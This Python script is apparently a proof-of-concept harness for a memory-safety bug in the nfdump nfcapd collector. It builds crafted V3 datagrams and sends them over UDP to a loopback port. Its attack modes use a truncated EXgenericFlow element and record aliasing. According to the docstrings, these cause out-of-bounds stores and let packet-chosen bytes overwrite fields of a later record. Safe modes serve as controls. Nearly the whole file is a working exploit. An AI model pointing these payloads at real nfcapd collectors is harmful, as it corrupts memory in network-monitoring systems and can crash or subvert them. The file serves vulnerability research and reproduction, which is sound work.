#!/usr/bin/env python3
"""Send a pinned nfdump V3 datagram to a loopback nfcapd.

Modes mirror harness/adjacent.c: 'attack' has a truncated EXgenericFlow
element (type 1, length 20), 'safe' has the complete 52-byte element, and
'icmp' adds packet-chosen bytes that trigger the pinned ICMP port swap.
'single' is the 48-byte one-record datagram from harness/driver.c.
'alias'/'alias-safe' put the swapped bytes in a later processed record.
"""
import argparse
import socket
import struct

VERSION_NFDUMP = 250
V3_RECORD = 11
EX_GENERIC_FLOW = 1
EX_SIZE = 52
REC_HDR = struct.Struct("<HHHBBHBB")  # 12 bytes, pinned recordHeaderV3_t
ELEM_HDR = struct.Struct("<HH")       # 4 bytes, pinned elementHeader_t
NFD_HDR = struct.Struct(">HHIII")     # 16 bytes, pinned nfd_header_t (network order)
DUMMY_TYPE = 42       # < MAXEXTENSIONS (43); not generic flow or received IP
DUMMY_LEN = 8         # includes the 4-byte element header
ALIAS_SRC_PORT = 0x1234


def record(elem_len, payload, nfversion=3):
    """One V3 record with a single EXgenericFlow element."""
    return (REC_HDR.pack(V3_RECORD, REC_HDR.size + elem_len, 1,
                         0, 0, 0, 0, nfversion)
            + ELEM_HDR.pack(EX_GENERIC_FLOW, elem_len) + payload)


def generic_flow(in_packets, in_bytes, proto=6):
    p = bytearray(EX_SIZE - 4)
    struct.pack_into("<Q", p, 24, in_packets)  # inPackets
    struct.pack_into("<Q", p, 32, in_bytes)    # inBytes
    p[44] = proto
    return bytes(p)


def alias_datagram(first):
    """Record 1's truncated element aliases record 2's payload.

    Record 1 has a truncated flow element (length 20) plus one 8-byte dummy
    element, so its size is 40 and record 2 starts at record1+40. The
    truncated element's EXgenericFlow view then sees record 2's payload at
    offsets 0 (srcPort), 2 (dstPort) and 4 (proto). The ICMP swap writes
    packet-chosen srcPort bytes into record 2's dstPort, which is copied
    and processed later in the same Process_nfd loop. The msecReceived OOB
    store at payload+16 lands on record 1's own dummy element, leaving
    record 2's header intact — unlike the earlier alias attempt.
    """
    victim_payload = bytearray(generic_flow(5, 500))
    victim_payload[0:2] = struct.pack("<H", ALIAS_SRC_PORT)  # swap source
    victim_payload[2:4] = b"\x00\x00"                       # dstPort before
    victim_payload[4] = 1                                    # ICMP seen by rec 1
    victim = record(EX_SIZE, bytes(victim_payload))

    if first == "attack":
        elems = ((EX_GENERIC_FLOW, 20, b"\x11" * 16),
                 (DUMMY_TYPE, DUMMY_LEN, bytes(DUMMY_LEN - 4)))
    else:
        p = bytearray(generic_flow(3, 180))
        p[40:42] = struct.pack("<H", ALIAS_SRC_PORT)
        elems = ((EX_GENERIC_FLOW, EX_SIZE, bytes(p)),)

    body = REC_HDR.pack(V3_RECORD, REC_HDR.size + sum(e[1] for e in elems),
                        len(elems), 0, 0, 0, 0, 3)
    for etype, elen, payload in elems:
        body += ELEM_HDR.pack(etype, elen) + payload
    body += victim
    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                        1764000000, 1, 2) + body


def datagram(mode):
    if mode in ("alias", "alias-safe"):
        return alias_datagram("attack" if mode == "alias" else "safe")

    if mode == "single":
        body = record(20, b"\x41" * 16)
        count = 1

    else:
        if mode == "safe":
            elem_len = EX_SIZE
            payload = generic_flow(3, 180)
        else:
            elem_len = 20
            payload = bytearray(b"\x11" * 16)
            if mode == "icmp":
                # Aliased with the next record's payload bytes 8..12 in the
                # 64 KiB receive buffer: srcPort/dstPort/proto of the short
                # element's EXgenericFlow view.
                payload[8:13] = bytes((0xde, 0xad, 0x5a, 0x5a, 1))
            payload = bytes(payload)
        body = record(elem_len, payload) + record(EX_SIZE, generic_flow(5, 500))
        count = 2
    return NFD_HDR.pack(VERSION_NFDUMP, NFD_HDR.size + len(body),
                        1764000000, 1, count) + body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("port", type=int)
    ap.add_argument("mode", choices=("attack", "safe", "icmp", "single",
                                     "alias", "alias-safe"))
    a = ap.parse_args()
    pkt = datagram(a.mode)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(pkt, ("127.0.0.1", a.port))
    s.close()
    r2 = NFD_HDR.size + REC_HDR.size + 20 if a.mode in ("attack", "icmp") else None
    if r2 is not None:
        print("R2_HDR_BEFORE=" + pkt[r2:r2 + 8].hex())
    print("WIRE_MODE=%s WIRE_LEN=%d" % (a.mode, len(pkt)))

if __name__ == "__main__":
    main()
